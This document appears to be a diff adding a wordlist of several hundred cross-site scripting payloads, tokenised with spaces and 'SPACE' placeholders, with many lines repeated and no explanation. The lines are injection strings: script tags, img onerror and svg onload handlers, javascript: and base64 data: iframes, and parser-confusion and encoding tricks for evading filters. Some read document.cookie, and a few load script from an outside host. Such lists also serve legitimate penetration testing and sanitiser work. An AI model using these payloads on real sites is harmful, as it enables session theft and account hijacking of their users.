+% 22 % 3E % 3Cb % 3E % 3Cnoscript % 3E % 3C ! -- % 20 % 3C/noscript % 3E % 3Cimg % 20src=xx : % 20onerror=alert ( 1 ) % 20 -- % 3E % 3C/noscript % 3E
+' % 3E % 3Cb % 3E % 3Cnoscript % 3E % 3C ! -- % 20 % 3C/noscript % 3E % 3Cimg % 20src=xx : % 20onerror=alert ( 1 ) % 20 -- % 3E % 3C/noscript % 3E
+% 3Cb % 3E % 3Cnoscript % 3E % 3Ca % 20alt= % 22 % 3C/noscript % 3E % 3Cimg % 20src=xx : % 20onerror=alert ( 1 ) % 3E % 22 % 3E % 3C/noscript % 3E
+% 22 % 3E % 3Cb % 3E % 3Cnoscript % 3E % 3Ca % 20alt= % 22 % 3C/noscript % 3E % 3Cimg % 20src=xx : % 20onerror=alert ( 1 ) % 3E % 22 % 3E % 3C/noscript % 3E
+' % 3E % 3Cb % 3E % 3Cnoscript % 3E % 3Ca % 20alt= % 22 % 3C/noscript % 3E % 3Cimg % 20src=xx : % 20onerror=alert ( 1 ) % 3E % 22 % 3E % 3C/noscript % 3E
+' % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E % 3C/iframe % 3E % 3C/option % 3E
+% 3Cimage % 20name=body % 3E % 3Cimage % 20name=adoptNode % 3EX % 3Cimage % 20name=firstElementChild % 3E % 3Csvg % 20onload=alert ( 1 ) % 3E
+% 22 % 3E % 3Cimage % 20name=body % 3E % 3Cimage % 20name=adoptNode % 3EX % 3Cimage % 20name=firstElementChild % 3E % 3Csvg % 20onload=alert ( 1 ) % 3E
+' % 3E % 3Cimage % 20name=body % 3E % 3Cimage % 20name=adoptNode % 3EX % 3Cimage % 20name=firstElementChild % 3E % 3Csvg % 20onload=alert ( 1 ) % 3E
+% 3Cimage % 20name=activeElement % 3E % 3Csvg % 20onload=alert ( 1 ) % 3E
+% 22 % 3E % 3Cimage % 20name=activeElement % 3E % 3Csvg % 20onload=alert ( 1 ) % 3E
+' % 3E % 3Cimage % 20name=activeElement % 3E % 3Csvg % 20onload=alert ( 1 ) % 3E
+% 3Csvg % 3E % 3C ! [ CDATA [ % 3E % 3Cimage % 20xlink : href= % 22 ] ] % 3E % 3Cimg % 20src=xx : x % 20onerror=alert ( 1 ) // % 22 % 3E % 3C/svg % 3E
+% 22 % 3E % 3Csvg % 3E % 3C ! [ CDATA [ % 3E % 3Cimage % 20xlink : href= % 22 ] ] % 3E % 3Cimg % 20src=xx : x % 20onerror=alert ( 1 ) // % 22 % 3E % 3C/svg % 3E
+' % 3E % 3Csvg % 3E % 3C ! [ CDATA [ % 3E % 3Cimage % 20xlink : href= % 22 ] ] % 3E % 3Cimg % 20src=xx : x % 20onerror=alert ( 1 ) // % 22 % 3E % 3C/svg % 3E
+% 3C % 3Cstyle % 3E % 3Cimg % 20src= % 22 % 3C/style % 3E % 3Cimg % 20src=x % 20onerror=alert ( 1 ) // % 22 % 3E
+% 22 % 3E % 3C % 3Cstyle % 3E % 3Cimg % 20src= % 22 % 3C/style % 3E % 3Cimg % 20src=x % 20onerror=alert ( 1 ) // % 22 % 3E
+' % 3E % 3C % 3Cstyle % 3E % 3Cimg % 20src= % 22 % 3C/style % 3E % 3Cimg % 20src=x % 20onerror=alert ( 1 ) // % 22 % 3E
+% 3C ? xml-stylesheet % 20type= % 22text/xsl % 22 % 20href= % 22data : , % 3Cxsl : transform % 20version= ' 1.0 ' % 20xmlns : xsl='http : //www.w3.org/1999/XSL/Transform ' % 20id='xss ' % 3E % 3Cxsl : output % 20method='html'/ % 3E % 3Cxsl : template % 20match='/ ' % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E % 3C/xsl : template % 3E % 3C/xsl : transform % 3E % 22 ? % 3E
+% 22 % 3E % 3C ? xml-stylesheet % 20type= % 22text/xsl % 22 % 20href= % 22data : , % 3Cxsl : transform % 20version= ' 1.0 ' % 20xmlns : xsl='http : //www.w3.org/1999/XSL/Transform ' % 20id='xss ' % 3E % 3Cxsl : output % 20method='html'/ % 3E % 3Cxsl : template % 20match='/ ' % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E % 3C/xsl : template % 3E % 3C/xsl : transform % 3E % 22 ? % 3E
+' % 3E % 3C ? xml-stylesheet % 20 type= % 22 text/xsl % 22 % 20href= % 22data : , % 3Cxsl : transform % 20 version= ' 1.0 ' % 20xmlns : xsl='http : //www.w3.org/1999/XSL/Transform ' % 20id='xss ' % 3E % 3Cxsl : output % 20 method='html'/ % 3E % 3Cxsl : template % 20 match='/ ' % 3E % 3Cscript % 3Ealert ( 1 ) % 3C /script % 3E % 3C /xsl : template % 3E % 3C /xsl : transform % 3E % 22 ? % 3E
+`` onclick=prompt ( 8 ) > < svg/onload=prompt ( 8 ) > " @ x.y
+< image/src/onerror=prompt ( 8 ) >
+< img/src/onerror=prompt ( 8 ) >
+< image SPACE src/onerror=prompt ( 8 ) >
+< img SPACE src/onerror=prompt ( 8 ) >
+< image SPACE src SPACE =q SPACE onerror=prompt ( 8 ) >
+< img SPACE src SPACE =q SPACE onerror=prompt ( 8 ) >
+< /scrip < /script > t > < img SPACE src SPACE =q SPACE onerror=prompt ( 8 ) >
+< img SPACE src=1 SPACE href=1 SPACE onerror= " javascript : alert ( 1 ) " > < /img >
+< image SPACE src=1 SPACE href=1 SPACE onerror= " javascript : alert ( 1 ) " > < /image >
+< script SPACE src=1 SPACE href=1 SPACE onerror= " javascript : alert ( 1 ) " > < /script >
+-- > < ! -- SPACE -- - > SPACE < img SPACE src=xxx : x SPACE onerror=javascript : alert ( 1 ) > SPACE -- >
+< script SPACE src= " data : \xD4\x8F , javascript : alert ( 1 ) " > < /script >
+< script SPACE src= " data : \xE0\xA4\x98 , javascript : alert ( 1 ) " > < /script >
+< script SPACE src= " data : \xCB\x8F , javascript : alert ( 1 ) " > < /script >
+< ! -- < img SPACE src= " -- > < img SPACE src=x SPACE onerror=javascript : alert ( 1 ) // " >
+< style > < img SPACE src= " < /style > < img SPACE src=x SPACE onerror=javascript : alert ( 1 ) // " >
+< ? SPACE foo= " > < script > javascript : alert ( 1 ) < /script > " >
+< ! SPACE foo= " > < script > javascript : alert ( 1 ) < /script > " >
+< / SPACE foo= " > < script > javascript : alert ( 1 ) < /script > " >
+< script > ReferenceError.prototype.__defineGetter__ ( 'name ' , SPACE function ( ) { javascript : alert ( 1 ) } ) , x < /script >
+< script > javascript : alert ( 1 ) < /script >
+< BODY SPACE ONLOAD=javascript : alert ( 1 ) >
+< IFRAME SPACE SRC= " javascript : javascript : alert ( 1 ) ; " > < /IFRAME >
+> < /SCRIPT > " > ' > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT >
+< IMG SPACE `` " " > < SCRIPT > alert ( `` XSS " ) < /SCRIPT > " >
+< < SCRIPT > alert ( `` XSS " ) ; // < < /SCRIPT >
+< /TITLE > < SCRIPT > alert ( `` XSS " ) ; < /SCRIPT >
+< BODY SPACE ONLOAD=alert ( 'XSS ' ) >
+< IFRAME SPACE SRC= " javascript : alert ( 'XSS ' ) ; " > < /IFRAME >
+< ScRipT SPACE 5-0 * 3+9/3= > prompt ( 1 ) < /ScRipT SPACE giveanswerhere= ?
+< script SPACE / * % 00 * / > / * % 00 * /alert ( 1 ) / * % 00 * / < /script SPACE / * % 00 * /
+< script SPACE ^__^ > alert ( String.fromCharCode ( 49 ) ) < /script SPACE ^__^
+< script SPACE / * * * / > / * * * /confirm ( '\ uFF41 \ uFF4C \ uFF45 \ uFF52 \ uFF54 \ u1455 \ uFF11 \ u1450 ' ) / * * * / < /script SPACE / * * * /
+< script SPACE ~~~ > alert ( 0 % 0 ) < /script SPACE ~~~ >
+/ * iframe/src * / < iframe/src= " < iframe/src= @ " /onload=prompt ( 1 ) SPACE / * iframe/src * / >
+< img SPACE src= " / " SPACE =_= " SPACE title= " onerror='prompt ( 1 ) ' " >
+< script SPACE src= " data : text/javascript , alert ( 1 ) " > < /script >
+http : //www. < script > alert ( 1 ) < /script SPACE .com
+< script > +-+-1-+-+alert ( 1 ) < /script >
+< script SPACE x > SPACE alert ( 1 ) SPACE < /script SPACE 1=2
+< -- ` < img/src= ` SPACE onerror=alert ( 1 ) > SPACE -- ! >
+< iframe SPACE src= " data : text/html , % 3C % 73 % 63 % 72 % 69 % 70 % 74 % 3E % 61 % 6C % 65 % 72 % 74 % 28 % 31 % 29 % 3C % 2F % 73 % 63 % 72 % 69 % 70 % 74 % 3E " > < /iframe >
+< ScRiPt > alert ( 1 ) < /sCriPt >
+< img SPACE src=xss SPACE onerror=alert ( 1 ) >
+< ScRipT SPACE 5-0 * 3+9/3= > prompt ( 1 ) < /ScRipT SPACE giveanswerhere = ?
+< script SPACE / * % 00 * / > / * % 00 * /alert ( 1 ) / * % 00 * / < /script SPACE / * % 00 * /
+< script SPACE ^__^ > alert ( String.fromCharCode ( 49 ) ) < /script SPACE ^__^
+< script SPACE / * * * / > / * * * /confirm ( '\ uFF41 \ uFF4C \ uFF45 \ uFF52 \ uFF54 \ u1455 \ uFF11 \ u1450 ' ) / * * * / < /script SPACE / * * * /
+< script SPACE ~~~ > alert ( 0 % 0 ) < /script SPACE ~~~ >
+/ * iframe/src * / < iframe/src= " < iframe/src= @ " /onload=prompt ( 1 ) SPACE / * iframe/src * / >
+< img SPACE src= " / " SPACE =_= " SPACE title= " onerror='prompt ( 1 ) ' " >
+< script SPACE src= " data : text/javascript , alert ( 1 ) " > < /script >
+http : //www. < script > alert ( 1 ) < /script SPACE .com
+< script > +-+-1-+-+alert ( 1 ) < /script >
+< script SPACE x > SPACE alert ( 1 ) SPACE < /script SPACE 1=2
+< -- ` < img/src= ` SPACE onerror=alert ( 1 ) > SPACE -- ! >
+< iframe SPACE src= " data : text/html , % 3C % 73 % 63 % 72 % 69 % 70 % 74 % 3E % 61 % 6C % 65 % 72 % 74 % 28 % 31 % 29 % 3C % 2F % 73 % 63 % 72 % 69 % 70 % 74 % 3E " > < /iframe >
+‘ ; alert ( String.fromCharCode ( 88,83,83 ) ) // ’ ; alert ( String.fromCharCode ( 88,83,83 ) ) // ” ; alert ( String.fromCharCode ( 88,83,83 ) ) // ” ; alert ( String.fromCharCode ( 88,83,83 ) ) //– > < /SCRIPT > ” > ’ > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT >
+foo < script > alert ( 1 ) < /script >
+< `` ' ; alert ( String.fromCharCode ( 88,83,83 ) ) //\ ' ; alert ( String.fromCharCode ( 88,83,83 ) ) // " ; alert ( String.fromCharCode ( 88,83,83 ) ) //\ " ; alert ( String.fromCharCode ( 88,83,83 ) ) // -- > < /SCRIPT > " > ' > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT >
+< IFRAME SPACE SRC= " javascript : alert ( 'XSS ' ) ; " > < /IFRAME >
+< < SCRIPT > alert ( `` XSS " ) ; // < < /SCRIPT >
+< `` ' ; alert ( String.fromCharCode ( 88,83,83 ) ) //\ ' ; alert ( String.fromCharCode ( 88,83,83 ) ) // " ; alert ( String.fromCharCode ( 88,83,83 ) ) //\ " ; alert ( String.fromCharCode ( 88,83,83 ) ) // -- > < /SCRIPT > " > ' > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT >
+< script > alert ( `` hellox SPACE worldss " ) < /script > & safe=high & cx = 006665157904466893121 : su_tzknyxug & cof=FORID:9 # 510
+< script > alert ( `` XSS " ) ; < /script > & search=1
+< ! -- < img SPACE src= " -- > < img SPACE src=x SPACE onerror=alert ( XSS ) // " >
+< style > < img SPACE src= " < /style > < img SPACE src=x SPACE onerror=alert ( XSS ) // " >
+< ? SPACE foo= " > < script > alert ( 1 ) < /script > " >
+< ! SPACE foo= " > < script > alert ( 1 ) < /script > " >
+< / SPACE foo= " > < script > alert ( 1 ) < /script > " >
+< svg SPACE xmlns= " http : //www.w3.org/2000/svg " > LOL < script > alert ( 123 ) < /script > < /svg >
+' ; alert ( String.fromCharCode ( 88,83,83 ) ) //\ ' ; alert ( String.fromCharCode ( 88,83,83 ) ) // " ; alert ( String.fromCharCode ( 88,83,83 ) ) //\ " ; alert ( String.fromCharCode ( 88,83,83 ) ) // -- > < /SCRIPT > " > ' > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT >
+< IMG SPACE `` " " > < SCRIPT > alert ( `` XSS " ) < /SCRIPT > " >
+< < SCRIPT > alert ( `` XSS " ) ; // < < /SCRIPT >
+< /TITLE > < SCRIPT > alert ( `` XSS " ) ; < /SCRIPT >
+< IFRAME SPACE SRC= " javascript : alert ( 'XSS ' ) ; " > < /IFRAME >
+< ! -- < img SPACE src= " -- > < img SPACE src=x SPACE onerror=alert ( 123 ) // " >
+< style > < img SPACE src= " < /style > < img SPACE src=x SPACE onerror=alert ( 123 ) // " >
+< object SPACE data= " data : text/html ; base64 , PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg == " >
+< embed SPACE src= " data : text/html ; base64 , PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg == " >
+< ? SPACE foo= " > < script > alert ( 1 ) < /script > " >
+< ! SPACE foo= " > < script > alert ( 1 ) < /script > " >
+< / SPACE foo= " > < script > alert ( 1 ) < /script > " >
+< script > ReferenceError.prototype.__defineGetter__ ( 'name ' , SPACE function ( ) { alert ( 123 ) } ) , x < /script >
+< svg SPACE onload= " javascript : alert ( 123 ) " SPACE xmlns= " # " > < /svg >
+“ > < ScRiPt > alert ( document.cookie ) < /script >
+“ > < < script > alert ( document.cookie ) ; // < < /script >
+foo < script > alert ( document.cookie ) < /script >
+< /script > < script SPACE > alert ( document.cookie ) < /script >
+< img SPACE src=asdf SPACE onerror=alert ( document.cookie ) >
+< script > alert ( 1 ) < /script >
+`` > < script > alert ( String.fromCharCode ( 66 , SPACE 108 , SPACE 65 , SPACE 99 , SPACE 75 , SPACE 73 , SPACE 99 , SPACE 101 ) ) < /script >
+' ; alert ( String.fromCharCode ( 88,83,83 ) ) // ' ; alert ( String.fromCharCode ( 88,83,83 ) ) // " ; alert ( String.fromCharCode ( 88,83,83 ) ) // " ; alert ( String.fromCharCode ( 88,83,83 ) ) // -- > < /SCRIPT > " > ' > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT >
+< IMG SPACE `` " " > < SCRIPT > alert ( `` XSS " ) < /SCRIPT > " >
+< IMG SPACE SRC=/ SPACE onerror= " alert ( String.fromCharCode ( 88,83,83 ) ) " > < /img >
+< < SCRIPT > alert ( `` XSS " ) ; // < < /SCRIPT >
+< /script > < script > alert ( 'XSS ' ) ; < /script >
+< /TITLE > < SCRIPT > alert ( `` XSS " ) ; < /SCRIPT >
+< BODY SPACE ONLOAD=alert ( 'XSS ' ) >
+< IFRAME SPACE SRC= " javascript : alert ( 'XSS ' ) ; " > < /IFRAME >
+veris -- > group < svg/onload=alert ( /XSS/ ) //
+element [ attribute= ' < img SPACE src=x SPACE onerror=alert ( 'XSS ' ) ; >
+< svg/onload = % 26 %23097lert % 26 lpar ; 1337 ) >
+< IMG SPACE SRC=x SPACE onerror= " alert ( String.fromCharCode ( 88,83,83 ) ) " >
+< IMG SPACE SRC=x SPACE onerror= " alert ( String.fromCharCode ( 88,83,83 ) ) " >
+`` > < h1 > < IFRAME SPACE SRC= " javascript : alert ( 'XSS ' ) ; " > < /IFRAME > " > 123 < /h1 >
+< IFRAME SPACE SRC= " javascript : alert ( 'XSS ' ) ; " > < /IFRAME >
+`` > < /iframe > < script > alert ( ` TEXT SPACE YOU SPACE WANT SPACE TO SPACE BE SPACE DISPLAYED ` ) ; < /script > < iframe SPACE frameborder= " 0 % EF % BB % BF
+< IFRAME SPACE width= " 420 " SPACE height= " 315 " SPACE frameborder= " 0 " SPACE onload= " alert ( document.cookie ) " > < /IFRAME >
+`` > < h1 > < IFRAME SPACE SRC= " javascript : alert ( 'XSS ' ) ; " > < /IFRAME > " > 123 < /h1 >
+< iframe SPACE src=http : //xss.rocks/scriptlet.html SPACE <
+< IFRAME SPACE SRC= " javascript : alert ( 'XSS ' ) ; " > < /IFRAME >
+< ScRipT SPACE 5-0 * 3+9/3= > prompt ( 1 ) < /ScRipT SPACE giveanswerhere= ?
+< script SPACE / * * / > / * * /alert ( 1 ) / * * / < /script SPACE / * * /
+< script SPACE ^__^ > alert ( String.fromCharCode ( 49 ) ) < /script SPACE ^__^
+< script SPACE / * * * / > / * * * /confirm ( '\ uFF41 \ uFF4C \ uFF45 \ uFF52 \ uFF54 \ u1455 \ uFF11 \ u1450 ' ) / * * * / < /script SPACE / * * * /
+< script SPACE ~~~ > alert ( 0 % 0 ) < /script SPACE ~~~ >
+/ * iframe/src * / < iframe/src= " < iframe/src= @ " /onload=prompt ( 1 ) SPACE / * iframe/src * / >
+< img SPACE src= " / " SPACE =_= " SPACE title= " onerror='prompt ( 1 ) ' " >
+< script SPACE src= " data : text/javascript , alert ( 1 ) " > < /script >
+http : //www. < script > alert ( 1 ) < /script SPACE .com
+< script > +-+-1-+-+alert ( 1 ) < /script >
+< script SPACE x > SPACE alert ( 1 ) SPACE < /script SPACE 1=2
+< -- ` < img/src= ` SPACE onerror=alert ( 1 ) > SPACE -- ! >
+< iframe SPACE src= " data : text/html , % 3C % 73 % 63 % 72 % 69 % 70 % 74 % 3E % 61 % 6C % 65 % 72 % 74 % 28 % 31 % 29 % 3C % 2F % 73 % 63 % 72 % 69 % 70 % 74 % 3E " > < /iframe >
+< img SPACE src=1 SPACE href=1 SPACE onerror= " javascript : alert ( 1 ) " > < /img >
+< image SPACE src=1 SPACE href=1 SPACE onerror= " javascript : alert ( 1 ) " > < /image >
+< script SPACE src=1 SPACE href=1 SPACE onerror= " javascript : alert ( 1 ) " > < /script >
+-- > < ! -- SPACE -- - > SPACE < img SPACE src=xxx : x SPACE onerror=javascript : alert ( 1 ) > SPACE -- >
+< script SPACE src= " data : \xD4\x8F , javascript : alert ( 1 ) " > < /script >
+< script SPACE src= " data : \xE0\xA4\x98 , javascript : alert ( 1 ) " > < /script >
+< script SPACE src= " data : \xCB\x8F , javascript : alert ( 1 ) " > < /script >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( 1 ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( ' 1 ' ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( `` 1 " ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( ` 1 ` ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( ( ' 1 ' ) ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( ( `` 1 " ) ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( ( ` 1 ` ) ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( ( ' A ' ) ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( ' A ' ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( ( `` A " ) ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( `` A " ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( ( ` A ` ) ) >
+`` > < img SPACE src=x SPACE onerror=javascript : alert ( ` A ` ) >
+< ! -- < img SPACE src= " -- > < img SPACE src=x SPACE onerror=javascript : alert ( 1 ) // " >
+< style > < img SPACE src= " < /style > < img SPACE src=x SPACE onerror=javascript : alert ( 1 ) // " >
+< ? SPACE foo= " > < script > javascript : alert ( 1 ) < /script > " >
+< ! SPACE foo= " > < script > javascript : alert ( 1 ) < /script > " >
+< / SPACE foo= " > < script > javascript : alert ( 1 ) < /script > " >
+< script > ReferenceError.prototype.__defineGetter__ ( 'name ' , SPACE function ( ) { javascript : alert ( 1 ) } ) , x < /script >
+< script > javascript : alert ( 1 ) < /script >
+< BODY SPACE ONLOAD=javascript : alert ( 1 ) >
+< IFRAME SPACE SRC= " javascript : javascript : alert ( 1 ) ; " > < /IFRAME >
+> < /SCRIPT > " > ' > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT >
+< IMG SPACE `` " " > < SCRIPT > alert ( `` XSS " ) < /SCRIPT > " >
+< < SCRIPT > alert ( `` XSS " ) ; // < < /SCRIPT >
+< /TITLE > < SCRIPT > alert ( `` XSS " ) ; < /SCRIPT >
+< BODY SPACE ONLOAD=alert ( 'XSS ' ) >
+< IFRAME SPACE SRC= " javascript : alert ( 'XSS ' ) ; " > < /IFRAME >
+< ScRipT SPACE 5-0 * 3+9/3= > prompt ( 1 ) < /ScRipT SPACE giveanswerhere= ?
+< script SPACE / * * / > / * * /alert ( 1 ) / * * / < /script SPACE / * * /
+< script SPACE ^__^ > alert ( String.fromCharCode ( 49 ) ) < /script SPACE ^__^
+< script SPACE / * * * / > / * * * /confirm ( '\ uFF41 \ uFF4C \ uFF45 \ uFF52 \ uFF54 \ u1455 \ uFF11 \ u1450 ' ) / * * * / < /script SPACE / * * * /
+< script SPACE ~~~ > alert ( 0 % 0 ) < /script SPACE ~~~ >
+/ * iframe/src * / < iframe/src= " < iframe/src= @ " /onload=prompt ( 1 ) SPACE / * iframe/src * / >
+< img SPACE src= " / " SPACE =_= " SPACE title= " onerror='prompt ( 1 ) ' " >
+< script SPACE src= " data : text/javascript , alert ( 1 ) " > < /script >
+< script > +-+-1-+-+alert ( 1 ) < /script >
+< script SPACE x > SPACE alert ( 1 ) SPACE < /script SPACE 1=2
+< -- ` < img/src= ` SPACE onerror=alert ( 1 ) > SPACE -- ! >
+< iframe SPACE src= " data : text/html , % 3C % 73 % 63 % 72 % 69 % 70 % 74 % 3E % 61 % 6C % 65 % 72 % 74 % 28 % 31 % 29 % 3C % 2F % 73 % 63 % 72 % 69 % 70 % 74 % 3E " > < /iframe >
+< script > alert ( 1 ) ; < /script >
+< script > alert ( 'XSS ' ) ; < /script >
+< IMG SPACE `` " " > < SCRIPT > alert ( `` XSS " ) < /SCRIPT > " >
+< script > alert ( String.fromCharCode ( 88,83,83 ) ) < /script > SPACE
+< img SPACE src=foo.png SPACE onerror=alert ( /xssed/ ) SPACE / >
+< marquee > < script > alert ( 'XSS ' ) < /script > < /marquee >
+`` > < script > alert ( 0 ) < /script >
+< /title > < script > alert ( /xss/ ) < /script >
+< /textarea > < script > alert ( /xss/ ) < /script >
+< script SPACE language= " JavaScript " > alert ( 'XSS ' ) < /script >
+< body SPACE onLoad= " alert ( 'XSS ' ) ; "
+`` / > < /a > < / > < img SPACE src=1.gif SPACE onerror=alert ( 1 ) >
+' " > > < script > alert ( 'XSS ' ) < /script >
+< /script > < script > alert ( 1 ) < /script >
+`` > < /iframe > < script > alert ( 123 ) < /script >
+< body SPACE onLoad= " while ( true ) SPACE alert ( 'XSS ' ) ; " >
+' " > < /title > < script > alert ( 1111 ) < /script >
+< /textarea > ' " > < script > alert ( document.cookie ) < /script >
+' " " > < script SPACE language= " JavaScript " > SPACE alert ( ' X SPACE \nS SPACE \nS ' ) ; < /script >
+' > < /select > < script > alert ( 123 ) < /script >
+} < /style > < script > a=eval ; b=alert ; a ( b ( /XSS/.source ) ) ; < /script >
+= ' > < script > alert ( `` xss " ) < /script >
+< body SPACE background=javascript : ' " > < script > alert ( navigator.userAgent ) < /script > > < /body >
+`` > /XaDoS/ > < script > alert ( document.cookie ) < /script > < script SPACE src= " http : //www.site.com/XSS.js " > < /script >
+`` > /KinG-InFeT.NeT/ > < script > alert ( document.cookie ) < /script >
+! -- " SPACE / > < script > alert ( 'xss ' ) ; < /script >
+< script > alert ( `` XSS SPACE by SPACE \nxss " ) < /script > < marquee > < h1 > XSS SPACE by SPACE xss < /h1 > < /marquee >
+`` > < script > alert ( `` XSS SPACE by SPACE \nxss " ) < /script > > < marquee > < h1 > XSS SPACE by SPACE xss < /h1 > < /marquee >
+' " > < /title > < script > alert ( `` XSS SPACE by SPACE \nxss " ) < /script > > < marquee > < h1 > XSS SPACE by SPACE xss < /h1 > < /marquee >
+< img SPACE `` " " > < script > alert ( `` XSS SPACE by SPACE \nxss " ) < /script > < marquee > < h1 > XSS SPACE by SPACE xss < /h1 > < /marquee >
+< script > alert ( 1337 ) < /script > < marquee > < h1 > XSS SPACE by SPACE xss < /h1 > < /marquee >
+`` > < script > alert ( 1337 ) < /script > " > < script > alert ( `` XSS SPACE by SPACE \nxss < /h1 > < /marquee >
+' " > < /title > < script > alert ( 1337 ) < /script > > < marquee > < h1 > XSS SPACE by SPACE xss < /h1 > < /marquee >
+< iframe SPACE src= " javascript : alert ( 'XSS SPACE by SPACE \nxss ' ) ; " > < /iframe > < marquee > < h1 > XSS SPACE by SPACE xss < /h1 > < /marquee >
+' > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT > < img SPACE src= " " SPACE alt= '
+`` > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT > < img SPACE src= " " SPACE alt= "
+\ ' > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT > < img SPACE src= " " SPACE alt=\ '
+> " > < ScRiPt % 20 % 0a % 0d > alert ( 561177485777 ) % 3B < /ScRiPt >
+< img SPACE src= " Mario SPACE Heiderich SPACE says SPACE that SPACE svg SPACE SHOULD SPACE not SPACE be SPACE executed SPACE trough SPACE image SPACE tags " SPACE onerror= " javascript : document.write ( '\ u003c \ u0069 \u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e ' ) ; " > < /img >
+< BODY SPACE ONLOAD=alert ( `` XSS " ) >
+`` > < script > alert ( 'XSS ' ) < /script >
+`` > < script > alert ( 'XSS ' ) < /script >
+> " > < script > alert ( `` XSS " ) < /script > &
+< script > alert ( 'XSS ' ) < /script >
+% 3cscript % 3ealert ( 'XSS ' ) % 3c/script % 3e
+% 22 % 3e % 3cscript % 3ealert ( 'XSS ' ) % 3c/script % 3e
+< img SPACE src=xss SPACE onerror=alert ( 1 ) >
+< IMG SPACE `` " " > < SCRIPT > alert ( `` XSS " ) < /SCRIPT > " >
+< BODY SPACE ONLOAD=alert ( 'XSS ' ) >
+< < SCRIPT > alert ( `` XSS " ) ; // < < /SCRIPT >
